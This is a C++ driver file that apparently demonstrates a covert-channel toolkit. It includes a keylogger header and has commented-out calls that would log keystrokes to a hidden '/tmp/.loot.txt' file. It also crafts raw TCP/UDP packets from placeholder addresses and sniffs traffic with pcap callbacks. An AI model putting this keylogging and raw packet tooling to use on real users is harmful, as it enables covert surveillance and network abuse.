#include <iostream>
#include <string>
#include <vector>

#include <unistd.h>

#include "NetworkEngine.h"
#include "TcpStack.h"
#include "authenticator.h"
#include "crypto.h"

#include "Keylogger.h"

int main(int argc, char *argv[]) {
    const char *interfaceName = "wlp59s0";
    const short sport = 42069;
    const short dport = 7575;
    struct in_addr srcAddr;
    struct in_addr dstAddr;
    srcAddr.s_addr = 0xDEADBEEF;
    dstAddr.s_addr = 0xEFBEADDE;

    // Keylogger kl("/tmp/.loot.txt");
    // kl.start_logging(); // should be started in another thread

    UCharVector data({'a', 'b', 'c', 'd', 'e'});

    Authenticator auth;
    Crypto cryptoEngine("key");
    NetworkEngine netEngine(interfaceName);

    std::cout << auth.generateSignature(sport) << std::endl;
    std::cout << auth.generateSignature(dport) << std::endl;

    // crypto examples
    UCharVector ciphertext = cryptoEngine.enc(data);
    UCharVector plaintext = cryptoEngine.dec(ciphertext);

    // tcp sending examples
    for (int i = 0; i < 10; i++) {
        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport, TcpStack::SYN_FLAG, data)
                  << std::endl;
        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport,
                                       TcpStack::SYN_FLAG | TcpStack::ACK_FLAG, data)
                  << std::endl;
    }

    // udp sending examples
    for (int i = 0; i < 10; i++) {
        std::cout << netEngine.sendRawUdp(srcAddr, dstAddr, sport, dport, data) << std::endl;
    }

    // adding functions to process payload received from pcap loop
    auto cb1 = [](const pcap_pkthdr *header, const unsigned char *payload, NetworkEngine *) -> void {
        std::cout << "cb1" << std::endl;
    };
    auto cb2 = [](const pcap_pkthdr *header, const unsigned char *payload, NetworkEngine *) -> void {
        std::cout << "cb2" << std::endl;
    };
    auto cb3 = [](const pcap_pkthdr *header, const unsigned char *payload, NetworkEngine *) -> void {
        std::cout << "cb3" << std::endl;
    };
    netEngine.LoopCallbacks.push_back(cb1);
    netEngine.LoopCallbacks.push_back(cb2);
    netEngine.LoopCallbacks.push_back(cb3);

    // example of starting and stopping sniffing
    std::cout << "starting sniff" << std::endl;
    // TODO: Change the filter to only capture UDP packets for the port we're listening on?
    netEngine.startSniff(NetworkEngine::IP_FILTER);
    sleep(2);
    std::cout << "stopping sniff" << std::endl;
    netEngine.stopSniff();

    return 0;
}
